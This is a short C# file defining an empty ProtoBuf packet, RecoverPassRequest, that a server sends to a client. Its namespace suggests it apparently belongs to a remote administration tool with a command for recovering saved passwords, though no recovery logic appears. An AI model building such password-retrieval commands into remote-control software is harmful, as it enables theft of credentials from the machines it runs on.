using ProtoBuf;
using System;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class RecoverPassRequest : IPacket
    {
        public RecoverPassRequest()
        {
        }
        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
